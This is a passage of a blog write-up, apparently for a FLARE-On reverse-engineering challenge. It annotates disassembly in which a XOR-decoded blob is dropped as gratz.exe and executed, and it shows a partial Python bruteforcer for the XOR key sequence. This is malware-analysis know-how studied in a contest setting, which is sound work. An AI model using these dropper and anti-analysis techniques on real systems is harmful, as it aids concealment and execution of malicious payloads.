+
+<p><img src="http://parsiya.net/images/2014/flare/7-21.jpg" alt="Sifting through the tweet" title="Sifting through the tweet" /></p>
+
+<p>We retrieved the tweet. Now <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/bb773436%28v=vs.85%29.aspx">strstr</a> is called to find the first instance of <code>Secluded Hi</code> in the tweet. The return value is a point to the start of <code>Secluded HijackRAT http://t.co/ckx18JHdkb ...</code>. The application adds <code>0x0B</code> or 11 to the start of the string to skip <code>Secluded Hi</code> and point to <code>jackRAT http://t.co/ckx18JHdkb ...</code>. A new 8 character buffer is created and passed to <a href="http://msdn.microsoft.com/en-us/library/xdsywd25.aspx">strncpy</a>. <code>strncpy</code> is called to copy 7 bytes from the start to the newly created buffer which will be <code>jackRAT</code>. The rest is simple, <code>jackRAT</code> is xor-ed with the blob and finally <a href="http://msdn.microsoft.com/en-us/library/windows/desktop/aa384350%28v=vs.85%29.aspx">InternetCloseHandle</a> is called three times to close the three function calls.</p>
+
+<p><img src="http://parsiya.net/images/2014/flare/7-22.jpg" alt="xor(blob,&quot;jackRAT&quot;)" title="xor(blob,&quot;jackRAT" /></p>
+
+<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>jackRAT xor </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
+</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="n">blob</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">blob</span><span class="p">,</span><span class="s">&quot;jackRAT&quot;</span><span class="p">)</span>
+</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+<h3 id="are-we-there-yet-gratz-but-not-yet">Are we there yet? gratz but not yet</h3>
+
+<div class="bogus-wrapper"><notextile><figure class="code"><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
+<span class="line-number">2</span>
+<span class="line-number">3</span>
+<span class="line-number">4</span>
+<span class="line-number">5</span>
+<span class="line-number">6</span>
+<span class="line-number">7</span>
+<span class="line-number">8</span>
+<span class="line-number">9</span>
+<span class="line-number">10</span>
+<span class="line-number">11</span>
+<span class="line-number">12</span>
+<span class="line-number">13</span>
+<span class="line-number">14</span>
+<span class="line-number">15</span>
+<span class="line-number">16</span>
+<span class="line-number">17</span>
+<span class="line-number">18</span>
+<span class="line-number">19</span>
+<span class="line-number">20</span>
+<span class="line-number">21</span>
+<span class="line-number">22</span>
+<span class="line-number">23</span>
+<span class="line-number">24</span>
+<span class="line-number">25</span>
+<span class="line-number">26</span>
+<span class="line-number">27</span>
+<span class="line-number">28</span>
+<span class="line-number">29</span>
+<span class="line-number">30</span>
+<span class="line-number">31</span>
+<span class="line-number">32</span>
+<span class="line-number">33</span>
+<span class="line-number">34</span>
+<span class="line-number">35</span>
+<span class="line-number">36</span>
+<span class="line-number">37</span>
+<span class="line-number">38</span>
+</pre></td><td class="code"><pre><code class="nasm"><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B83</span> <span class="nv">loc_401B83</span><span class="p">:</span>                             <span class="c1">; CODE XREF: .text:00401B58j</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B83</span> <span class="nv">call</span>    <span class="nv">InternetRootz</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B88</span> <span class="nv">call</span>    <span class="nv">jackRAT</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B8D</span> <span class="nv">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="o">+</span><span class="mi">4</span><span class="p">]</span>          <span class="c1">; you are here</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B90</span> <span class="nv">movzx</span>   <span class="nb">edx</span><span class="p">,</span> <span class="kt">byte</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">ecx</span><span class="p">]</span>   <span class="c1">; application crashes here if no arguments are provided</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B93</span> <span class="nv">mov</span>     <span class="nb">bl</span><span class="nv">ob</span><span class="p">,</span> <span class="nb">dl</span>              <span class="c1">; blob[0] = arg1[0]; first character of arg1 written to blob</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B99</span> <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="o">+</span><span class="mi">4</span><span class="p">]</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B9C</span> <span class="nv">mov</span>     <span class="nb">cl</span><span class="p">,</span> <span class="p">[</span><span class="nb">eax</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span>           <span class="c1">; cl = arg1[1]; second character of arg1</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">B9F</span> <span class="nv">mov</span>     <span class="kt">byte</span><span class="nv">_4131F9</span><span class="p">,</span> <span class="nb">cl</span>       <span class="c1">; blob[1] = arg1[1];</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BA5</span> <span class="nv">mov</span>     <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="o">+</span><span class="mi">8</span><span class="p">]</span>          <span class="c1">; edx = *(arg2);</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BA8</span> <span class="nv">mov</span>     <span class="nb">al</span><span class="p">,</span> <span class="p">[</span><span class="nb">edx</span><span class="p">]</span>             <span class="c1">; al = arg2[0];</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BAA</span> <span class="nv">mov</span>     <span class="kt">byte</span><span class="nv">_413278</span><span class="p">,</span> <span class="nb">al</span>       <span class="c1">; blob[0x80] = arg2[0]; 413278 - 413F9 = 0x7F</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BAF</span> <span class="nv">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">esi</span><span class="o">+</span><span class="mi">8</span><span class="p">]</span>          <span class="c1">; ecx = *(arg2);</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BB2</span> <span class="nv">movzx</span>   <span class="nb">edx</span><span class="p">,</span> <span class="kt">byte</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">ecx</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="c1">; edx = arg2[1];</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BB6</span> <span class="nv">lea</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">10h</span><span class="p">]</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BB9</span> <span class="nv">push</span>    <span class="nv">offset</span> <span class="nv">aWb</span>            <span class="c1">; mode: &quot;wb&quot; - write in binary mode</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BBE</span> <span class="nv">push</span>    <span class="nb">eax</span>                   <span class="c1">; push current path</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BBF</span> <span class="nv">mov</span>     <span class="kt">byte</span><span class="nv">_413279</span><span class="p">,</span> <span class="nb">dl</span>       <span class="c1">; blob[0x81] = arg2[1];</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BC5</span> <span class="nv">mov</span>     <span class="kt">dword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">10h</span><span class="p">],</span> <span class="mh">74617267h</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BCC</span> <span class="nv">mov</span>     <span class="kt">dword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">0Ch</span><span class="p">],</span> <span class="mh">78652E7Ah</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BD3</span> <span class="nv">mov</span>     <span class="kt">word</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mi">8</span><span class="p">],</span> <span class="mh">65h</span> <span class="c1">; &quot;gratz.exe&quot; saved in [ebp-10]</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BD9</span> <span class="nv">call</span>    <span class="nv">_fopen</span>                <span class="c1">; fopen(filename=&quot;currentpath\gratz.exe&quot;,mode=&quot;wb&quot;); Open if exists and if not create it</span>
+</span><span class="line">
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BDE</span> <span class="nv">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="nb">bl</span><span class="nv">ob_length</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BE4</span> <span class="nv">mov</span>     <span class="nb">esi</span><span class="p">,</span> <span class="nb">eax</span>              <span class="c1">; *(gratz.exe)</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BE6</span> <span class="nv">push</span>    <span class="nb">esi</span>                   <span class="c1">; FILE = *(gratz.exe)</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BE7</span> <span class="nv">push</span>    <span class="nb">ecx</span>                   <span class="c1">; size = blob length</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BE8</span> <span class="nv">push</span>    <span class="mi">1</span>                     <span class="c1">; count = 1</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BEA</span> <span class="nv">push</span>    <span class="nv">offset</span> <span class="nb">bl</span><span class="nv">ob</span>           <span class="c1">; buffer = *(blob)</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BEF</span> <span class="nv">call</span>    <span class="nv">_fwrite</span>               <span class="c1">; fwrite( *(blob), 1, blob_length, *(gratz.exe) ); Write blob to gratz.exe</span>
+</span><span class="line">
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BF4</span> <span class="nv">push</span>    <span class="nb">esi</span>                   <span class="c1">; push *(gratz.exe)</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BF5</span> <span class="nv">call</span>    <span class="nv">_fclose</span>               <span class="c1">; fclose( *(gratz.exe) ); Close gratz.exe</span>
+</span><span class="line">
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BFA</span> <span class="nv">lea</span>     <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mh">10h</span><span class="p">]</span>        <span class="c1">; edx = &quot;gratz.exe&quot;</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BFD</span> <span class="nv">push</span>    <span class="nb">edx</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">BFE</span> <span class="nv">call</span>    <span class="nv">_system</span>               <span class="c1">; system(&quot;gratz.exe&quot;); Execute gratz.exe</span>
+</span><span class="line"><span class="nl">.text:</span><span class="err">00401</span><span class="nf">C03</span> <span class="nv">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">-</span><span class="mi">4</span><span class="p">]</span>
+</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+<p>The application crashed in line 5 over and over again. When I looked inside ecx I saw empty space but looking around I saw the application’s complete path. After a while I realized that it is trying to read arguments. The rest is obvious from the code. First two characters of rist argument are written over the first two characters of the blob. First and second characters of second argument are written at offset <code>0x80</code>.</p>
+
+<p>Then <a href="http://msdn.microsoft.com/en-us/library/yeby3zcb.aspx">fopen</a> is called to create/open a file named <code>gratz.exe</code> for writing in binary mode (“wb”). Then blob is written to it by calling <a href="http://msdn.microsoft.com/en-us/library/h9t88zwz.aspx">fwrite</a> and finally it is closed with <a href="http://msdn.microsoft.com/en-us/library/fxfsw25t.aspx">fclose</a>. Then command <code>gratz.exe</code> is run via the <a href="http://msdn.microsoft.com/en-us/library/277bwbdz.aspx">system</a> call. So we are writing the blob to a file and then executing it.</p>
+
+<p>What is special about first two bytes in a Windows binary? It’s the start of the DOS stub with the magic bytes <code>MZ</code> and you have already guessed that the second argument should be <code>PE</code>.</p>
+
+<h3 id="how-do-i-xor">How do I XOR?</h3>
+
+<p>But how do we get the correct binary. As we have already seen, there are a series of checks and depending on the checks, different strings are xor-ed with the original blob. A correct sequence of strings will produce a correct binary. The path is probably known at this point, just bypass any Anti-VM/Anti-Debug countermeasures and other checks. But I am lazy and instead wrote a bruteforcer. In order for the bruteforcer to work, we need the original blob before any xors. That is easy. Set a breakpoint before any of the functions. Then set the Instruction Pointer to <code>00401B8D</code> and step through. Stop before the <code>system</code> call and copy the <code>gratz.exe</code> file.</p>
+
+<p>Here’s my bruteforcer. This is not good code but at this point I just wanted to finish.</p>
+
+<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span>bruteforcer </span></figcaption>
+<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
+<span class="line-number">2</span>
+<span class="line-number">3</span>
+<span class="line-number">4</span>
+<span class="line-number">5</span>
+<span class="line-number">6</span>
+<span class="line-number">7</span>
+<span class="line-number">8</span>
+<span class="line-number">9</span>
+<span class="line-number">10</span>
+<span class="line-number">11</span>
+<span class="line-number">12</span>
+<span class="line-number">13</span>
+<span class="line-number">14</span>
+<span class="line-number">15</span>
+<span class="line-number">16</span>
+<span class="line-number">17</span>
+<span class="line-number">18</span>
+<span class="line-number">19</span>
+<span class="line-number">20</span>
+<span class="line-number">21</span>
+<span class="line-number">22</span>
+<span class="line-number">23</span>
+<span class="line-number">24</span>
+<span class="line-number">25</span>
+<span class="line-number">26</span>
+<span class="line-number">27</span>
+<span class="line-number">28</span>
+<span class="line-number">29</span>
+<span class="line-number">30</span>
+<span class="line-number">31</span>
+<span class="line-number">32</span>
+<span class="line-number">33</span>
+<span class="line-number">34</span>
+<span class="line-number">35</span>
+<span class="line-number">36</span>
+<span class="line-number">37</span>
+<span class="line-number">38</span>
+<span class="line-number">39</span>
+<span class="line-number">40</span>
+<span class="line-number">41</span>
+<span class="line-number">42</span>
+<span class="line-number">43</span>
+<span class="line-number">44</span>
+<span class="line-number">45</span>
+<span class="line-number">46</span>
+<span class="line-number">47</span>
+<span class="line-number">48</span>
+<span class="line-number">49</span>
+<span class="line-number">50</span>
+<span class="line-number">51</span>
+<span class="line-number">52</span>
+<span class="line-number">53</span>
+<span class="line-number">54</span>
+<span class="line-number">55</span>
+<span class="line-number">56</span>
+<span class="line-number">57</span>
+<span class="line-number">58</span>
+<span class="line-number">59</span>
+<span class="line-number">60</span>
+<span class="line-number">61</span>
+<span class="line-number">62</span>
+<span class="line-number">63</span>
+<span class="line-number">64</span>
+<span class="line-number">65</span>
+<span class="line-number">66</span>
+<span class="line-number">67</span>
+<span class="line-number">68</span>
+<span class="line-number">69</span>
+<span class="line-number">70</span>
+<span class="line-number">71</span>
+<span class="line-number">72</span>
+<span class="line-number">73</span>
+<span class="line-number">74</span>
+<span class="line-number">75</span>
+<span class="line-number">76</span>
+<span class="line-number">77</span>
+<span class="line-number">78</span>
+<span class="line-number">79</span>
+<span class="line-number">80</span>
+<span class="line-number">81</span>
+<span class="line-number">82</span>
+<span class="line-number">83</span>
+<span class="line-number">84</span>
+<span class="line-number">85</span>
+<span class="line-number">86</span>
+<span class="line-number">87</span>
+<span class="line-number">88</span>
+<span class="line-number">89</span>
+<span class="line-number">90</span>
+<span class="line-number">91</span>
+<span class="line-number">92</span>
+<span class="line-number">93</span>
+<span class="line-number">94</span>
+<span class="line-number">95</span>
+<span class="line-number">96</span>
+<span class="line-number">97</span>
+<span class="line-number">98</span>
+<span class="line-number">99</span>
+<span class="line-number">100</span>
+<span class="line-number">101</span>
+<span class="line-number">102</span>
+<span class="line-number">103</span>
+<span class="line-number">104</span>
+<span class="line-number">105</span>
+<span class="line-number">106</span>
+<span class="line-number">107</span>
+<span class="line-number">108</span>
+<span class="line-number">109</span>
+<span class="line-number">110</span>
+<span class="line-number">111</span>
+<span class="line-number">112</span>
+<span class="line-number">113</span>
+<span class="line-number">114</span>
+<span class="line-number">115</span>
+<span class="line-number">116</span>
+<span class="line-number">117</span>
+<span class="line-number">118</span>
+<span class="line-number">119</span>
+<span class="line-number">120</span>
+<span class="line-number">121</span>
+<span class="line-number">122</span>
+<span class="line-number">123</span>
+<span class="line-number">124</span>
+<span class="line-number">125</span>
+<span class="line-number">126</span>
+<span class="line-number">127</span>
+<span class="line-number">128</span>
+<span class="line-number">129</span>
+<span class="line-number">130</span>
+<span class="line-number">131</span>
+<span class="line-number">132</span>
+<span class="line-number">133</span>
+<span class="line-number">134</span>
+<span class="line-number">135</span>
+<span class="line-number">136</span>
+<span class="line-number">137</span>
+<span class="line-number">138</span>
+<span class="line-number">139</span>
+<span class="line-number">140</span>
+<span class="line-number">141</span>
+<span class="line-number">142</span>
+<span class="line-number">143</span>
+<span class="line-number">144</span>
+<span class="line-number">145</span>
+<span class="line-number">146</span>
+</pre></td><td class="code"><pre><code class="python"><span class="line"><span class="n">key1</span><span class="o">=</span><span class="p">{}</span>
+</span><span class="line"><span class="n">key1</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="s">&#39;oh happy dayz&#39;</span>
+</span><span class="line"><span class="n">key1</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="s">&#39;the final countdown&#39;</span>
+</span><span class="line">
+</span><span class="line"><span class="n">key2</span><span class="o">=</span><span class="p">{}</span>
+</span><span class="line"><span class="n">key2</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="s">&#39;UNACCEPTABLE!&#39;</span>
+</span><span class="line"><span class="n">key2</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="s">&#39;omglob&#39;</span>
+</span><span class="line">
+</span><span class="line"><span class="n">key3</span><span class="o">=</span><span class="p">{}</span>
+</span><span class="line"><span class="n">key3</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="s">&#39;you</span><span class="se">\x27</span><span class="s">re so good&#39;</span>
+</span><span class="line"><span class="n">key3</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="s">&#39;you</span><span class="se">\x27</span><span class="s">re so bad&#39;</span>
+</span><span class="line">
+</span><span class="line"><span class="n">key4</span><span class="o">=</span><span class="p">{}</span>
+</span><span class="line"><span class="n">key4</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="s">&#39;</span><span class="se">\x66</span><span class="s">&#39;</span>
+</span><span class="line"><span class="n">key4</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="s">&#39;</span><span class="se">\x01</span><span class="s">&#39;</span>
+</span><span class="line">
+</span><span class="line"><span class="n">key5</span><span class="o">=</span><span class="p">{}</span>
+</span><span class="line"><span class="n">key5</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="s">&#39;Sandboxes are fun to play in&#39;</span>
+</span><span class="line"><span class="n">key5</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="s">&#39;I</span><span class="se">\x27</span><span class="s">m gonna sandbox your face&#39;</span>
+</span><span class="line">
+</span><span class="line"><span class="n">key6</span><span class="o">=</span><span class="p">{}</span>
+</span><span class="line"><span class="n">key6</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="s">&#39;I can haz decode?&#39;</span>
+</span><span class="line"><span class="n">key6</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="s">&#39;Such fire. Much burn. Wow.&#39;</span>
+</span><span class="line">
+</span><span class="line"><span class="n">key7</span><span class="o">=</span><span class="p">{}</span>
+</span><span class="line"><span class="n">key7</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="s">&#39;</span><span class="se">\x09\x00\x00\x01</span><span class="s">&#39;</span>
+</span><span class="line"><span class="n">key7</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="s">&#39;Feel the sting of the Monarch!&#39;</span>
+</span><span class="line">
+</span><span class="line"><span class="n">key8</span><span class="o">=</span><span class="p">{}</span>
+</span><span class="line"><span class="n">key8</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="s">&#39;! 50 1337&#39;</span>
+</span><span class="line"><span class="n">key8</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="s">&#39;1337&#39;</span>
+</span><span class="line">
+</span><span class="line"><span class="n">key9</span><span class="o">=</span><span class="p">{}</span>
+</span><span class="line"><span class="n">key9</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="s">&#39;LETS GO SHOPPING&#39;</span>
+</span><span class="line"><span class="n">key9</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="s">&#39;MATH IS HARD&#39;</span>
+</span><span class="line">
+</span><span class="line"><span class="n">key10</span><span class="o">=</span><span class="p">{}</span>
+</span><span class="line"><span class="n">key10</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="s">&#39;LETS GO MATH&#39;</span>
+</span><span class="line"><span class="n">key10</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="s">&#39;SHOPPING IS HARD&#39;</span>
+</span><span class="line">
+</span><span class="line"><span class="n">key11</span><span class="o">=</span><span class="p">{}</span>
+</span><span class="line"><span class="n">key11</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="s">&#39;</span><span class="se">\x01\x02\x03\x05\x00\x78\x30\x38\x0d</span><span class="s">&#39;</span>
+</span><span class="line"><span class="n">key11</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="s">&#39;</span><span class="se">\x07\x77</span><span class="s">&#39;</span>
+</span><span class="line">
+</span><span class="line"><span class="n">key12</span><span class="o">=</span><span class="p">{}</span>
+</span><span class="line"><span class="n">key12</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="s">&quot;backdoge.exe&quot;</span>
+</span><span class="line"><span class="n">key12</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="s">&quot;</span><span class="se">\x00</span><span class="s">&quot;</span>
+</span><span class="line">
+</span><span class="line"><span class="n">key13</span><span class="o">=</span><span class="p">{}</span>
+</span><span class="line"><span class="n">key13</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="s">&#39;192.203.230.10&#39;</span>
+</span><span class="line"><span class="n">key13</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="s">&#39;</span><span class="se">\x00</span><span class="s">&#39;</span>
+</span><span class="line">
+</span><span class="line"><span class="n">key14</span><span class="o">=</span><span class="p">{}</span>
+</span><span class="line"><span class="n">key14</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="s">&#39;</span><span class="se">\x00</span><span class="s">&#39;</span>
+</span><span class="line"><span class="n">key14</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="s">&#39;jackRAT&#39;</span>
+</span><span class="line">
+</span><span class="line"><span class="n">index</span><span class="o">=</span><span class="p">{}</span>
+</span><span class="line"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">15</span><span class="p">):</span>
+</span><span class="line">    <span class="n">index</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span>
+</span><span class="line">
+</span><span class="line">
+</span><span class="line"><span class="c"># we want this to support variable length keys</span>
+</span><span class="line"><span class="c"># so if the key is smaller than data, it will wrap around</span>
+</span><span class="line"><span class="k">def</span> <span class="nf">xor</span><span class="p">(</span><span class="n">mydata</span><span class="p">,</span><span class="n">mykey</span><span class="p">):</span>
+</span><span class="line">    <span class="n">keylen</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">mykey</span><span class="p">)</span>
+</span><span class="line">    <span class="n">datalen</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">mydata</span><span class="p">)</span>
+</span><span class="line">
+</span><span class="line">    <span class="c"># easier to just extend the key array, but probably not that memory efficient</span>
+</span><span class="line">    <span class="c"># not that we care about it here ;)</span>
+</span><span class="line">    <span class="n">key</span> <span class="o">=</span> <span class="n">mykey</span> <span class="o">*</span> <span class="p">(</span> <span class="p">(</span><span class="n">datalen</span><span class="o">/</span><span class="n">keylen</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span> <span class="p">)</span>
+</span><span class="line">
+</span><span class="line">    <span class="k">return</span> <span class="s">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">b</span><span class="p">))</span> <span class="k">for</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">mydata</span><span class="p">,</span><span class="n">key</span><span class="p">))</span>
+</span><span class="line">
+</span><span class="line">
+</span><span class="line"><span class="kn">from</span> <span class="nn">binascii</span> <span class="kn">import</span> <span class="n">hexlify</span><span class="p">,</span> <span class="n">unhexlify</span>
+</span><span class="line">
+</span><span class="line"><span class="n">myfile</span> <span class="o">=</span> <span class="nb">file</span><span class="p">(</span><span class="s">&#39;c:</span><span class="se">\\</span><span class="s">extractedgratz.exe&#39;</span><span class="p">,</span><span class="s">&#39;rb&#39;</span><span class="p">)</span>
+</span><span class="line">
+</span><span class="line"><span class="n">wholefile</span> <span class="o">=</span> <span class="n">myfile</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span><span class="line">
+</span><span class="line"><span class="n">out</span> <span class="o">=</span> <span class="n">wholefile</span><span class="p">[:</span><span class="mh">0x10</span><span class="p">]</span>
+</span><span class="line">
+</span><span class="line"><span class="n">myfile</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span><span class="line">
+</span><span class="line">
+</span><span class="line"><span class="n">counter</span> <span class="o">=</span> <span class="mi">0</span>
+</span><span class="line">
+</span><span class="line"><span class="k">for</span> <span class="n">index</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
+</span><span class="line">  <span class="k">for</span> <span class="n">index</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
+</span><span class="line">    <span class="k">for</span> <span class="n">index</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
+</span><span class="line">      <span class="k">for</span> <span class="n">index</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
+</span><span class="line">        <span class="k">for</span> <span class="n">index</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
+</span><span class="line">          <span class="k">for</span> <span class="n">index</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
+</span><span class="line">            <span class="k">for</span> <span class="n">index</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
+</span><span class="line">              <span class="k">for</span> <span class="n">index</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
+</span><span class="line">                <span class="k">for</span> <span class="n">index</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
+</span><span class="line">                  <span class="k">for</span> <span class="n">index</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
+</span><span class="line">                    <span class="k">for</span> <span class="n">index</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
+</span><span class="line">                      <span class="k">for</span> <span class="n">index</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
+</span><span class="line">                        <span class="k">for</span> <span class="n">index</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
